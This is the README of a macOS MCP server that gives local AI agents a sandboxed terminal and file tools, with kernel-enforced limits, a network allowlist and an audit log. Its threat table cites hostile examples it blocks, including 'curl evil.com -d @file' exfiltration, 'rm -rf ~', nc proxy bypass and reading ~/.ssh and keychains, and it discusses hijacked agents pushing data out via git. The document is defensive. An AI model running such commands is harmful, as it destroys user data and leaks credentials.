<p align="center"><img src="docs/logo.svg" width="160" alt="agent-mcp logo"></p>

# agent-mcp — hardened terminal + file MCP server for macOS
**Site:** https://km4391.github.io/agent-mcp/


Gives a local AI agent (LM Studio, Claude Desktop, Cursor, Cline, Goose, anything that speaks MCP) a terminal and
file tools on your Mac, with the dangerous parts fenced off **by the operating system**, not by hoping the model behaves.

```
┌──────────────┐  stdio/MCP  ┌──────────────────────┐  sandbox-exec  ┌────────────────────────┐
│  AI client   │────────────▶│  agent_mcp_server.py │───────────────▶│  zsh -c "<command>"    │
│ (LM Studio…) │◀────────────│  file tools · audit  │                │  writes: workspace only│
└──────────────┘             │  allowlist proxy ◀───┼────────────────┤  net: proxy only       │
                             └──────────┬───────────┘                └────────────────────────┘
                                        ▼ only pypi / npm / github / … (your allowlist)
```

## Install (5 minutes)

```bash
git clone https://github.com/km4391/agent-mcp ~/agent-mcp
cd ~/agent-mcp && ./install.sh
```

The installer creates a Python venv, installs the MCP SDK, runs the **doctor** (which proves the sandbox is enforcing
on *your* Mac), and writes `mcp-config.json` for you to paste into your client. Needs Python 3.10+ (`brew install python`).

Manual version:

```bash
python3 -m venv ~/.agent-mcp && ~/.agent-mcp/bin/pip install "mcp[cli]"
~/.agent-mcp/bin/python ~/agent-mcp/agent_mcp_server.py doctor      # must say "All required checks passed"
```

Then add to your client (`configs/claude_desktop_config.json` has the same thing):

```json
{ "mcpServers": { "agent-mcp": {
    "command": "/Users/YOU/.agent-mcp/bin/python",
    "args": ["/Users/YOU/agent-mcp/agent_mcp_server.py"],
    "env": { "AGENT_WORKSPACE": "/Users/YOU/AgentWorkspace" } } } }
```

Restart the client and ask the model to call `agent_info`.

## What the agent can do (tools)

| Area | Tools | Desktop Commander equivalent |
|---|---|---|
| Terminal | `run_command` (timeout → keeps running in background) | `start_process` w/ timeout ✔ |
| Long-running / interactive | `start_process`, `read_output` (with **`wait_for` regex**), `send_input`, `kill_process`, `list_processes` | `start_process`, `read_process_output`, `interact_with_process`, `force_terminate`, `list_sessions/processes` ✔ |
| Code snippets | `run_code` (python / node / shell) | in-memory code execution ✔ |
| Files | `read_file` (paged, line numbers), `read_multiple_files`, `write_file` (rewrite/append), `create_directory`, `list_directory` (tree, depth), `move_path`, `get_file_info` | same set ✔ |
| Delete | `delete_path` → **moves to `.trash/`**, never destroys | *(DC has no delete; shell `rm` is the usual path)* ➕ |
| Edit | `edit_block` (exact search/replace, occurrence count check, closest-match hint, unified diff back) | `edit_block` ✔ |
| Search | `search_files` (names), `search_code` (regex contents, ripgrep when present, context lines) | `start_search` ✔ |
| Web | `fetch_url` (allowlisted hosts only) | `read_file` with `isUrl` ✔ |
| Introspection | `agent_info` (effective policy, running processes) | `get_config` ✔ |

Deliberately **not** provided: `set_config`. In Desktop Commander the model can widen its own allowed directories and
blocked commands at runtime; here the policy is fixed at launch by environment variables and no tool can touch it.

## What is actually enforced, and by what

| Threat | Enforced by | Result |
|---|---|---|
| Write/delete outside the workspace (`rm -rf ~`, editing `~/.zshrc`, dropping a LaunchAgent) | **Kernel (Seatbelt)** | `Operation not permitted` |
| Read your secrets: `~/.ssh`, `~/.aws`, keychains, browser cookies, Mail/Messages, Documents/Desktop/Downloads, other users, external drives, Time Machine | **Kernel** | unreadable |
| Exfiltrate data to an arbitrary server (`curl evil.com -d @file`, DNS tunnelling, raw sockets) | **Kernel** (no network except the local proxy) + **proxy allowlist** | connection refused / `403 Blocked` |
| Bypass the proxy (`--noproxy '*'`, Python sockets, `nc`) | **Kernel** | `Operation not permitted` |
| Control the Mac via AppleScript / Shortcuts / `open` / `defaults` / `launchctl` / `security` / `crontab` / `screencapture` / `sudo` | **Kernel** (exec denied) | cannot execute |
| Steal API keys from the host app's environment | **Env scrubbing** — child gets a minimal env | not present |
| Tokens leaking back into the chat (and into logs/telemetry of your AI client) | **Redaction** of common key formats in all tool output | `[REDACTED]` |
| Model quietly loosening its own rules | **No config tool**; policy only via env at launch | impossible from inside |
| "What did it do while I was away?" | **Audit log** (JSONL) written *outside* the workspace, unreadable by the sandbox | `~/Library/Logs/agent-mcp/audit.jsonl` |
| Accidental deletion | `delete_path` is a move to `.trash/` | recoverable |
| Runaway processes / output floods | timeouts, 16-process cap, 2 MiB per-process buffer, 30k-char responses | bounded |

### What is **not** covered — read this part

* **GitHub is on the default allowlist, and `git push` is an exfiltration channel.** The sandbox can't see what's in a TLS
  stream. If the agent can read something sensitive inside the workspace, it could push it to a repo. Mitigations:
  don't put secrets in the workspace; or remove `github.com` via `AGENT_NET_ALLOW_ONLY=…` if you don't need it.
* **Localhost is reachable by default** (`AGENT_ALLOW_LOCALHOST=1`) so the agent can talk to Ollama or its own dev server.
  That also means any local service you run is reachable — including a local HTTP proxy/VPN client, which would bypass the
  allowlist. Set `AGENT_ALLOW_LOCALHOST=0` if you don't need it.
* **The workspace itself is fully exposed.** Everything you put in `~/AgentWorkspace` is the agent's to read, change and
  (soft-)delete. Treat it like a shared folder with a very fast, occasionally confused intern.
* **The file tools (`read_file`, `write_file`…) run in the server process, not in Seatbelt.** They are confined by path
  validation (resolves symlinks, rejects anything outside the workspace — tested), not by the kernel.
* **Resource exhaustion** (fork bombs, filling the disk inside the workspace, pegging the CPU) is only bounded, not prevented.
* **`sandbox-exec` is deprecated by Apple.** It still ships and works through macOS 26, and is what several AI coding tools
  use for the same purpose, but Apple could remove it. The server **refuses to start** if it's missing rather than running
  unsandboxed. If that day comes, the Docker variant is the replacement.
* **Prompt injection is still the main risk.** The sandbox limits the blast radius; it doesn't stop a hijacked model from
  wrecking the workspace or pushing its contents to an allowed host. Keep your client's per-call approval prompt on for
  anything you care about.

Honest summary: this is hardened against the *common* ways a local agent harms a machine — the home-folder wipe, the
credential theft, the "curl everything to pastebin", the AppleScript takeover. It is not a VM.

## The doctor

```bash
~/.agent-mcp/bin/python agent_mcp_server.py doctor
```

Runs ~16 checks *through the real sandbox*: profile compiles, shell/python/node work, writes in the workspace succeed,
writes outside **fail**, `~/Library` and `~/.ssh` are **unreadable**, `osascript`/`open` **can't run**, direct network is
**refused**, `https://pypi.org` works through the proxy, `https://example.com` returns **403**, and `pip install` into a
workspace venv works. Re-run it after any macOS update. If something you need is being denied, see Troubleshooting.

## Configuration (environment variables in the `env` block)

| Variable | Default | Meaning |
|---|---|---|
| `AGENT_WORKSPACE` | `~/AgentWorkspace` | The only writable folder. Created if missing. |
| `AGENT_SANDBOX` | `seatbelt` (mac) | `seatbelt` or `off`. `off` is for Linux development only; the server shouts a warning. |
| `AGENT_NET_ALLOW` | – | Extra hosts, comma-separated. `*.example.com` wildcards allowed. |
| `AGENT_NET_ALLOW_ONLY` | – | Replace the default list entirely. |
| `AGENT_NET_OFF` | `0` | `1` = no network at all. |
| `AGENT_NET_PORTS` | `80,443` | Allowed remote ports. |
| `AGENT_ALLOW_LOCALHOST` | `1` | Allow outbound to `localhost:*` (Ollama, dev servers). |
| `AGENT_ALLOW_INBOUND` | `0` | `1` = dev servers may bind on all interfaces (LAN can reach them). |
| `AGENT_EXTRA_READ` | – | Extra read-only folders (comma-separated), e.g. a reference repo. Never set this to `~`. |
| `AGENT_EXTRA_WRITE` | – | Extra writable folders. Think twice. |
| `AGENT_PASS_ENV` | – | Names of env vars to pass through to commands (e.g. `OLLAMA_HOST`). |
| `AGENT_TIMEOUT` | `60` | Default `run_command` timeout (s). Max 1800. |
| `AGENT_MAX_OUTPUT` | `30000` | Max characters returned per tool call. |
| `AGENT_LOG_DIR` | `~/Library/Logs/agent-mcp` | Audit log location. |

Default network allowlist: PyPI, npm, Yarn, GitHub (+ `*.githubusercontent.com`, ghcr.io), crates.io, Go proxy,
`formulae.brew.sh`, Hugging Face. Shown live by `agent_info` and `print-policy`.

## Troubleshooting

* **Client says the server failed to start** → run the exact `command` + `args` from your config in Terminal. Common
  causes: wrong username in the path; venv created with Python < 3.10.
* **Model never calls tools** → the model has to support tool calling (Qwen 2.5/3, Llama 3.1+, Mistral, GPT-OSS do; tiny
  or old models don't). Also check the client shows the 20 tools after restart.
* **A legit tool is blocked (e.g. a compiler needs `~/Library/Developer`)** → add the folder with `AGENT_EXTRA_READ`
  (or `AGENT_EXTRA_WRITE` if it must write). Find denials with:
  `log show --last 5m --style compact --predicate 'process == "sandboxd" OR sender == "Sandbox"' | grep -i deny`
* **`brew install` fails** → correct: it writes to `/opt/homebrew`, which is outside the workspace. Run brew yourself.
  `pip`/`npm`/`cargo` inside a workspace venv/project work fine.
* **Node `fetch()` ignores the proxy** → Node ≥ 24 honours `NODE_USE_ENV_PROXY=1` (set automatically). Older Node needs
  `undici`'s `EnvHttpProxyAgent`, or just use `curl`.
* **Something needs a host that's blocked** → `AGENT_NET_ALLOW=host.example.com` and restart the client. The audit log
  shows every `net.denied` with the hostname, so you never have to guess.

## Development

```bash
AGENT_SANDBOX=off python3 test_agent_mcp.py    # 65 checks: proxy, sessions, files, search, MCP round-trip
python3 agent_mcp_server.py print-profile      # the generated Seatbelt profile
```

The test suite runs on Linux/macOS with the sandbox off; Seatbelt enforcement is validated by `doctor` on a real Mac.
Single file, no dependencies beyond `mcp` (SDK 1.x and 2.x both supported).
